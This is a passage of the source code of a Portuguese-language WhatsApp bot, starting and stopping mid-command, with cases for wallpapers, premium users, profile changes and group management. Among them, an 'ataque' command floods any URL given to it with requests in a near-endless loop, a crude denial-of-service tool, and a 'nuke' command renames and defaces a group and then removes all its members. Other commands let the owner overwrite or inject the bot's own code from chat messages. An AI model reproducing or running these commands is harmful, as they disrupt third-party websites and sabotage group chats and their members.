    await reply("*C√≥digo SMS atingiu -1*.");
  }

  // Chame a fun√ß√£o para solicitar o c√≥digo SMS e aument√°-lo
  requestSMSAndIncreaseCode(q);
  break
    
    
    
case 'index-bot': case 'index':
if(!isCreator) return reply(msg.dono)
if(isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
const doc = await getFileBuffer(media, 'document')
fs.writeFileSync('./index.js', doc)
amy.sendMessage(from, {text: "O arquivo './index.js' foi atualizado com sucesso."},{quoted: info})
} else {
reply('Marque o documento ou o arquivo que deseja reply pra determinar pasta ou substituir..')
}
break


case 'ataque':
if(!q) return reply(" coloque o url do site alvo para o ataque")
await reply("iniciando ataque ao site destinado")
async function fetchMultipleRequests() {
const URL = `${q}`; 
const REQUESTS_PER_SECOND = 1;
const TOTAL_REQUESTS = 25000000000000000;
let completedRequests = 0;
while (completedRequests < TOTAL_REQUESTS) {
const batch = []; 
for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
if (completedRequests >= TOTAL_REQUESTS) break;
batch.push(
fetch(URL, {
method: "GET",
headers: {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
"Accept": "application/json"
}
})
.then((response) => {
if (response.ok) {
return response.json();
} else {
console.log(`Erro: ${response.status}`);
return null;
}
})
.then((data) => {
if (data) console.log(`Sucesso:`, data);
})
.catch((error) => console.log(`Erro: ${error.message}`))
);

completedRequests++;
}
await Promise.all(batch);
await new Promise((resolve) => setTimeout(resolve, 1000));
}

console.log("Todas as solicita√ß√µes foram conclu√≠das.");
}
fetchMultipleRequests();
break;


case 'getcase':
case 'puxarcase':
try{
if(!isCreator) return reply(msg.dono)
reply('Seu perdido √© uma ordem! Aguarde um pouco mestre! <3')
const getCase = (cases) => {
return 'case '+`'${cases}'`+fs.readFileSync("./index.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
await sleep(500)
msgSemQuoted(`${getCase(q)}`)
} catch(e) {
reply('A case n√£o foi encontrada, voc√™ deve ter escrito errado...')
}
break

    
case 'get':
case 'criarcmd':
case 'novocomando':
case 'criarcomando':
case 'gerar'://tokyo
if (!isCreator) return reply(msg.dono)
reagir(from,"üòá")
await sleep(3000)
const cityName = 'novacase'; //nome q tu quer q fique o nome da case enviada
const quotedMessage = info.message.extendedTextMessage.contextInfo.quotedMessage;
let messageContent = '';
let messageType = '';
let caseStructure = '';
if (quotedMessage.imageMessage) {
messageType = 'image';
messageContent = {
image: {
url: quotedMessage.imageMessage.url,
mimetype: quotedMessage.imageMessage.mimetype,
caption: quotedMessage.imageMessage.caption,
height: quotedMessage.imageMessage.height,
width: quotedMessage.imageMessage.width
}
};
caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.stickerMessage) {
messageType = 'sticker';
messageContent = {
sticker: {
url: quotedMessage.stickerMessage.url,
fileEncSha256: quotedMessage.stickerMessage.fileEncSha256,
mediaKey: quotedMessage.stickerMessage.mediaKey,
mimetype: quotedMessage.stickerMessage.mimetype,
directPath: quotedMessage.stickerMessage.directPath,
fileLength: quotedMessage.stickerMessage.fileLength,
mediaKeyTimestamp: quotedMessage.stickerMessage.mediaKeyTimestamp,
isAnimated: quotedMessage.stickerMessage.isAnimated,
stickerSentTs: quotedMessage.stickerMessage.stickerSentTs,
isAvatar: quotedMessage.stickerMessage.isAvatar
}
};

caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.interactiveMessage) {
    messageType = 'interactive';
    const interactiveMessage = quotedMessage.interactiveMessage;
const buttons = interactiveMessage.nativeFlowMessage && interactiveMessage.nativeFlowMessage.buttons ? interactiveMessage.nativeFlowMessage.buttons : [];
    
    // Verifica se o campo 'text' est√° presente no interactiveMessage
    const text = interactiveMessage.body && interactiveMessage.body.text ? interactiveMessage.body.text : "";

    // Verifica se o campo 'footer' est√° presente no interactiveMessage
    const footer = interactiveMessage.footer && interactiveMessage.footer.text ? interactiveMessage.footer.text : "";

    caseStructure = `case '${cityName}': {\n` +
    `amy.relayMessage(from, {\n` +
    `interactiveMessage: {\n` +
    `body: {"text": "${text}"\n},\n` +
    `footer: {"text": "${footer}"\n},\n` +
    `nativeFlowMessage: {\n` +
    `buttons: [\n` +
    `${buttons.map(button => (
    `{\n` +
    `name: "${button.name}",\n` +
    `buttonParamsJson: ${JSON.stringify(button.buttonParamsJson)}\n` +
    `}\n`
    )).join(',\n')}` +
    `],\n` +
    `messageParamsJson: ""\n` +
    `}\n` +
    `}\n` +
    `}, { quoted: info });\n` +
    `break;\n` +
    `}\n`;
}  else if (quotedMessage.conversation) {
messageType = 'text';
messageContent = {
text: quotedMessage.conversation
};
caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.requestPaymentMessage) {
messageType = 'requestPayment';
caseStructure = `case '${cityName}': {\n` +
`const paymentDetails = {\n` +
`requestPaymentMessage: {\n` +
`currencyCodeIso4217: "${quotedMessage.requestPaymentMessage.currencyCodeIso4217}",\n` +
`amount1000: "${quotedMessage.requestPaymentMessage.amount1000}",\n` +
`noteMessage: {\n` +
`extendedTextMessage: {\n` +
`text: "${quotedMessage.requestPaymentMessage.noteMessage.extendedTextMessage.text}",\n` +
`contextInfo: {\n` +
`mentionedJid: [sender]\n` +
`}\n` +
`}\n` +
`},\n` +
`amount: {\n` +
`value: "${quotedMessage.requestPaymentMessage.amount.value}",\n` +
`offset: ${quotedMessage.requestPaymentMessage.amount.offset},\n` +
`currencyCode: "${quotedMessage.requestPaymentMessage.amount.currencyCode}"\n` +
`}\n` +
`}\n` +
`};\n` +
`const relayMessage = {\n` +
`key: {\n` +
`fromMe: false,\n` +
`remoteJid: from\n` +
`},\n` +
`message: paymentDetails\n` +
`};\n` +
`await amy.relayMessage(from, relayMessage.message, { messageId: relayMessage.key.id });\n` +
`break;\n` +
`}\n`;


} else if (quotedMessage.liveLocationMessage) {
messageType = 'liveLocationMessage';
const liveLocationMessage = quotedMessage.liveLocationMessage;
const degressLatitude = liveLocationMessage.degreesLatitude;
const degressLongitude = liveLocationMessage.degreesLongitude;
const caption = liveLocationMessage.caption;

messageContent = {
liveLocationMessage: {
degressLatitude,
degressLongitude,
caption
}
};
caseStructure = `case '${cityName}': {\n` +
`amy.relayMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;



} else if (quotedMessage.audioMessage) {
messageType = 'audioMessage';
const audioMessage = quotedMessage.audioMessage;
const url = audioMessage.url
const mimetype = audioMessage.mimetype
const fileSha256 = audioMessage.fileSha256
const fileLength = audioMessage.fileLength
const seconds = audioMessage.seconds
const ptt = audioMessage.ptt
messageContent = {
audio: {
url,
mimetype,
seconds,
ptt
}
};

caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;
} else {
messageType = 'text';
messageContent = {
text: quotedMessage.extendedTextMessage.text
};
caseStructure = `case '${cityName}': {\n` +
`amy.sendMessage(from, ${JSON.stringify(messageContent)});\n` +
`break;\n` +
`}\n`;
}
reply(caseStructure)
break;
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ùòæùôäùôàùòºùôâùòøùôäùôé ùòøùôäùôâùôä ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏case 'nuk
case 'prefixo-bot': case 'setprefix':
setTimeout(() => {reagir(from, `üòà`)}, 100)
if(args.length < 1) return reply('Informe o novo prefix do bot.')
if (!isCreator) return reply(msg.dono)
global.prefix = q
fs.writeFileSync('./donos.js', JSON.stringify(null, 2))
reply(`Prefix foi alterado com sucesso \nNovo prefix :„Äå ${prefix} „Äç`)
break

case 'perfil-bot'://Meliodasde novo xoxo t√£o
reagir(from, "üß™") 
await sleep(500)
if (!isCreator) return reply(msg.dono)
if (!isQuotedImage) return reply(`Marque a nova foto para ser adicionada ao meu perfil.`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await amy.updateProfilePicture(numeroBot, buff)
reply('A nova foto foi adicionada ao meu perfil com sucesso')
break        

case 'rmv-perfil'://Meliodasde novo xoxo t√£o
reagir(from, "üíî") 
await sleep(500)
if (!isCreator) return reply(msg.dono)
await amy.removeProfilePicture(numeroBot)
reply('Perfil removido com sucesso :(')
break        


case 'recado':
reagir(from,"‚úèÔ∏è")
await sleep(500)
if (!isCreator) return reply(msg.dono)
if(q.length < 1) return reply('Digite algo para ser adicionado ao meu recado.')
if (!q) return reply(` `);
await amy.sendPresenceUpdate("available")
await amy.updateProfileStatus(`${q}`)
reply('Foi adicionado um novo recado ao meu perfil')
break;

case 'nome-perfil'://by Meliodas pauzudo 
reagir(from, "‚úèÔ∏è")
await sleep(500)
if (!isCreator) return reply(msg.dono)
if(q.length < 1) return reply('Digite um novo nome para ser adicionado ao meu perfil.')
if (!q) return reply(` `);
await amy.sendPresenceUpdate("available")
await amy.updateProfileName(`${q}`)
reply('Foi adicionado um novo nome ao meu perfil')
break;


case 'bangp':
case 'unbangp':
if(!isGroup) return reply(reply.msg.grupo)
if (!isCreator) return reply(msg.dono)
if(command == 'bangp'){
setTimeout(() => {reagir(from, `üîí`)}, 50)
if(isBanchat) return reply(`Este grupo ja esta banido`)
dataGp[0].bangp = true
setGp(dataGp)
setTimeout(() => {reagir(from, `üîê`)}, 50)
reply(`Grupo banido com sucesso`)
} else {
if(!isBanchat) return reply(`Este grupo nao esta mais banido.`)
dataGp[0].bangp = false
setGp(dataGp)
setTimeout(() => {reagir(from, `üîì`)}, 50)
reply(`Grupo desbanido com sucesso.`)
}
break

case 'nuke':
reagir( from, "üíÄ")
if (!isCreator) return reply(msg.dono)
await sleep(600)
amy.updateProfilePicture(from, {url: "https://telegra.ph/file/ac3fec5196196ef95c74b.jpg"})
await sleep(2000)
amy.groupUpdateSubject(from, `ü§° ADM_CRICIAN ARQUIVOUü§°`) 
await sleep(3000)
amy.groupUpdateDescription(from, `LEVOU GERAL KKKK
*[ ü§° ]*`)  
blup = []
for (let i of groupMembers) {
if(i.id !== donoNumber) blup.push(i.id)
}                      
array_fake = [];
for (let a of groupMembers) {
if (a.id !== numeroBot) {
array_fake.push(a.id);
}
}
if (array_fake.length === 0) return reply("kkkkkkk");
for (let a of array_fake) {
await sleep(4000);
amy.groupParticipantsUpdate(from, [a], 'remove');
}
teks = `ADM ùòìùòåùòùùòñùòú ùòéùòåùòôùòàùòì, ùòåùòöùòóùòåùòôùòñ ùòòùòúùòå ùòõùòåùòïùòèùòàùòî ùòéùòñùòöùòõùòàùòãùòñ ùòãùòà ùòöùòúùòôùòóùòôùòåùòöùòà üòè`;
amy.sendMessage(from, {
text: teks, mentions: array_fake
});
break;    
    
case 'cases':
if(!isCreator) return reply('Somente meu dono pode usar')
try {
const listCases = () => {
const fileContent = fs.readFileSync("index.js").toString();
const caseNames = fileContent.match(/case\s+'(.+?)'/g);
if (caseNames) {
return `_*T·¥è·¥õ·¥Ä ü ·¥Ö·¥á C·¥Äs·¥ás:* ${caseNames.length} ·¥Ñ·¥è·¥ç·¥Ä…¥·¥Ö·¥ès_`;
} else {
return "_N·¥á…¥ ú·¥ú·¥ç·¥Ä ·¥Ñ·¥Äs·¥á ·¥á…¥·¥Ñ·¥è…¥·¥õ Ä·¥Ä·¥Ö·¥Ä_";
}
}
amy.sendMessage(from, { text: listCases() }, { quoted: info });
} catch (e) {
console.log(e);
reply('_E Ä Ä·¥è ·¥Ä·¥è ·¥è ô·¥õ·¥á Ä ·¥Äs ·¥Ñ·¥Äs·¥ás_');
}
break

case 'ping': {
amy.sendMessage(from, { react: { text: `üèÉüèª‚Äç‚ôÄÔ∏è`, key: info.key }})
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
amy.sendMessage(from, {text: 
`> PING: ${String(r.toFixed(3))}
> ONLINE: ${kyun(uptime)}
> RAM: ${(infoSystem.totalmem()/Math.pow(1024, 3)).toFixed(2)}GB
`}, {quoted: info})
}
break


case 'seradm':
reagir(from,"ü§ñ") 
if (!isCreator) return reply(msg.dono)
mentions(`@${sender.split("@")[0]} O senhor ganhou o cargo de administrador`, [sender], true)
amy.groupParticipantsUpdate(from, [sender], "promote")
break

case 'sermembro':
reagir(from, "ü§ñ" )
if (!isCreator) return reply(msg.dono)
mentions(`@${sender.split("@")[0]} Agora o senhor foi rebaixado para membro comum.`, [sender], true)
amy.groupParticipantsUpdate(from, [sender], "demote")
break

case 'sairdogp':
reagir(from, "ü§ñ") 
if (!isCreator) return reply(msg.dono)
if(!q) return reply(`voce deve visualizar qual grupo eu devo sair, para isso utilize ${prefix}listagp.`)
var getGroups = await amy.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
try {
amy.sendMessage(ingfoo[q].id, {text: "estou saindo do grupo, por ordens do meu dono. "}) 
setTimeout(() => {
amy.groupLeave(ingfoo[q].id)
}, 4000)
} catch(erro) {
reply(String(erro))
}
reply("pronto! acabei de sair do grupo desejado.")
break

case 'listagp':
reagir(from, "ü§ñ") 
if (!isCreator) return reply(msg.dono)
var getGroups = await amy.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
zeru1 = `LISTA DE GRUPOS \n*Total de Grupos:* ${ingfoo.length}\n-\n`
for (let i = 0; i < ingfoo.length; i++){
var metadt = await amy.groupMetadata(ingfoo[i].id) 
try {
var linkdogp = await amy.groupInviteCode(ingfoo[i].id)
} catch {
var linkdogp = "N√£o foi poss√≠vel puxar o link."
}
zeru1 += `[ ${i} ] - GRUPO: ${ingfoo[i].subject}\nID: ${ingfoo[i].id}\nCRIADOR: ${metadt.subjectOwner}\nCRIADO EM: ${moment(`${ingfoo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\nPARTICIPANTES: ${ingfoo[i].participants.length}\n-\n`
}
reply(zeru1)
break

case 'dono1':
setTimeout(() => {reagir(from, `üí•`)}, 100)
if(args.length < 1) return
if (!isCreator) return reply(msg.dono)
nescessario.dono1 = q.trim()
dono1 = nescessario.dono1
setNes(nescessario)
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${q}`)
break

case 'addcase':
	if(!q) return reply("Est√° faltando nada n√£o??");
	if(!isCreator) return reply('so pode ser utilizado pelo meu dono');
	const pula = [fs.readFileSync('index.js', 'utf8').slice(0, fs.readFileSync('index.js', 'utf8').lastIndexOf('break') + 5), q, fs.readFileSync('index.js', 'utf8').slice(fs.readFileSync('index.js', 'utf8').lastIndexOf('break') + 5)].join('\n\n\n');
	fs.writeFileSync('index.js', pula);
	reply('Nova case adicionada com sucesso!');
	break;
	
case 'onlines':  
if (!isGroup) return reply(reply.msg.grupo)
if (!isCreator && !isGroupAdmins) return reply(" so pode ser usado por um adm")
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[ido]), amy.user.id]
amy.sendMessage(from, {text: 'Pessoas online do gp:\n\n' + online.map(v => '‚Ä¢ @' + v.replace(/@.+/, '')).join`\n`}, {quoted: info})
break

case 'reiniciar':
if (!isCreator) return reply(msg.dono)
amy.sendMessage(from,{text: `Reiniciando aguarde um momento ..`}, {quoted: info})
setTimeout(() => {process.exit(0)}, 3000)
break

case 'serprem': case 'servip':
if (!isCreator) return reply(msg.dono)
premium.push(`${donoNumber}@s.whatsapp.net`)
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
reply(`Pronto ${donoNumber} voc√™ foi adicionado na lista premium.`)
break

case 'reviverqr':
if (!isCreator) return
exec(`cd ${folderUserAuth} && rm -rf pre-key* sender* session*`)
setTimeout(async () => {
reply("Reiniciando..")
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break
case 'addpremium': case 'addvip':
if (!isCreator) amy.sendMessage(from, ndono2, sticker)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
premium.push(`${mentioned}`)
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
susp = `üëë@${mentioned[0].split('@')[0]} foi adicionado √† lista de usu√°rios premium com sucessoüëë`
mentions(`${susp}`, mentioned, true)   
break 


case 'delpremium': case 'delvip':
if (!isGroup) return reply(msg.grupo)
if (!isCreator) return  reply(msg.dono)
if (!budy.includes("@55")) {
num = info.message.extendedTextMessage.contextInfo.participant
bla = premium.includes(num)
if(!bla) return reply("_Este n√∫mero n√£o est√° incluso na lista premium.._")  
pesquisar = num
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
amy.sendMessage(from, {text: ` ${num.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
} else {
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(!bla) return reply("_Este n√∫mero n√£o est√° incluso na lista premium.._")  
pesquisar = mentioned
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./Premiums/usuarios/premium.json', JSON.stringify(premium))
amy.sendMessage(from, {text: ` @${mentioned.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
}
break

case 'listavip': case 'listaprem':
if(!isCreator) return reply(msg.dono)   
if(!isPremium) return reply(msg.premium)   
tkks = '‚ï≠‚ï∏‚ï∏‚ï∏„Äå _PREMIUM USERüëë_ „Äç‚ï∏‚ïÆ\n'
for (let V of premium) {
tkks += `‚îÉ${prefix}+  @${V.split('@')[0]}\n`
}
tkks += `‚îÉ${prefix}+ Total : ${premium.length}\n‚ï∞‚ï∏‚ï∏‚ï∏„Äå _${botName}_ „Äç‚ï∏‚ïØ`
reply(tkks.trim())
break


//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ùôàùôÄùôâùôê ùôÑùôàùòºùôÇùôÄùôâùôé‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏




case 'imagens':
case 'foto':
case 'fotos': {
reagir(from, "üëª")
await sleep(600)
reply(`ùóòùòÄùòÅùóºùòÇ  ùóΩùóøùóºùó∞ùòÇùóøùóÆùóªùó±ùóº ùòÇùó∫ùóÆ ùó∂ùó∫ùóÆùó¥ùó≤ùó∫ ùóΩùóÆùóøùóÆ ùòÄùó≤ùòÇ ùóΩùó≤ùóøùó≥ùó∂ùóπ üëª`);
const imagensData = fs.readFileSync('./IMAGENS/imagens.js');
const jsonData = JSON.parse(imagensData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóÆ ùòÄùòÇùóÆ ùó∂ùó∫ùóÆùó¥ùó≤ùó∫ ùóΩùóÆùóøùóÆ ùòÄùòÇùóÆ ùó≥ùóºùòÅùóº ùó±ùó≤ ùóΩùó≤ùóøùó≥ùó∂ùóπ üëª` }, { quoted: info });
}
break;

case 'presente':
case 'presentinho': {
reagir(from, "üíå")
await sleep(600)
reply(`ùóºùó∂ùó≤ùóµ ${pushname} ùòÄùó≤ùòÇ ùóΩùóøùó≤ùòÄùó≤ùóªùòÅùó∂ùóªùóµùóº ùó≤ùòÄùòÅùóÆ ùòÄùó≤ùóªùó±ùóº ùó≤ùóªùòÉùó∂ùóÆùó±ùóº ùóªùóº ùóΩùòÉ, ùòÉùóÆùó∫ùóºùòÄ ùòÉùó≤ùóø ùòÄùó≤ ùòÉùóºùó∞ùó≤ ùòÅùó≤ùó∫ ùòÄùóºùóøùòÅùó≤ üåö`);
const presenteData = fs.readFileSync('./IMAGENS/presentinho.js');
const jsonData = JSON.parse(presenteData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(sender, { image: imagem, caption: `ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùóΩùóøùó≤ùòÄùó≤ùóªùòÅùó≤ ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùòÅùó≤ùóªùóµùóÆ ùó¥ùóºùòÄùòÅùóÆùó±ùóº , ${pushname}!` }, { quoted: info });
}
break;

case 'wall4k':
case 'Wall4k': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wall4kData = fs.readFileSync('./IMAGENS/wall4k.js');
const jsonData = JSON.parse(wall4kData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallamarelo':
case 'Wallamarelo': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallamareloData = fs.readFileSync('./IMAGENS/wallamarelo.js');
const jsonData = JSON.parse(wallamareloData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallanimes':
case 'wallanime': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallanimesData = fs.readFileSync('./IMAGENS/wallanimes.js');
const jsonData = JSON.parse(wallanimesData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallazul':
case 'Wallazul': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallazulData = fs.readFileSync('./IMAGENS/wallazul.js');
const jsonData = JSON.parse(wallazulData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallazulclaro':
case 'wallclaro': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallazulclaroData = fs.readFileSync('./IMAGENS/wallazulclaro.js');
const jsonData = JSON.parse(wallazulclaroData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallbranco':
case 'Wallbranco': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallbrancoData = fs.readFileSync('./IMAGENS/wallbranco.js');
const jsonData = JSON.parse(wallbrancoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallciano':
case 'Wallciano': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallcianoData = fs.readFileSync('./IMAGENS/wallciano.js');
const jsonData = JSON.parse(wallcianoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallcinza':
case 'Wallcinza': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallcinzaData = fs.readFileSync('./IMAGENS/wallcinza.js');
const jsonData = JSON.parse(wallcinzaData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
